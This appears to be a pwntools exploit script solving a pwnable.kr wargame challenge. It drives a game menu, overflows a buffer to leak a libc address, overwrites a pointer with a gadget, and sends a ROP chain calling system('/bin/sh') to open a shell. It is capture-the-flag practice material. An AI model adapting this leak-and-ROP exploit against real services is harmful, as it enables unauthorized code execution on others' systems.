#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys
import random

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

#p = process("./patched")
p = remote("pwnable.kr", 9020)

p.recvuntil("Ultralisk\n")

#choose templar

p.sendline("6")
p.recvuntil("strom) \n")

#change to arcon
p.sendline("1")
p.recvuntil("default) \n")

#start attack!

count = 0
while 1:
    #round
    p.sendline("0")
    data = p.recvuntil("default) \n")
    if "Stage" in data:
        count += 1
    if count == 11:
        
        #finish!
        break

p.sendline("1")
p.recvuntil("work : \n")

#p.send("aaa\n")
#p.interactive()
p.send("a" * 0x110 + p64(0x87) + p64(0x31) + p64(0x140)[:-1]+'\n')
data = p.recvuntil("*************************")

libc = data.split("arcon")[2].split("\x00\x00(me)")[0][-6:]
libc_exit = u64(libc.ljust(8,"\x00"))
print hex(libc_exit)

libc_base = libc_exit - 0x3a030
print hex(libc_base)
wait("leaked.")
one_ = libc_base + 0x000000000008e73e
p.sendline("1")
p.recvuntil("work : \n")
p.sendline("a" * 0x108 + p64(one_))
print p.recv()

system = libc_base + 0x45390
binsh = libc_base + 0x18cd57
pop_rdi = libc_base + 0x0000000000021102
p.sendline("0")
data2 = p.recvuntil("you win!")
if 'you win' in data2:

    wait("win")
    p.sendline("yes")
    p.recvuntil("command : ")
    p.sendline("a" * 8 + p64(pop_rdi) + p64(binsh) + p64(system))
    
p.interactive()

#p.sendline("1")
#p.interactive()
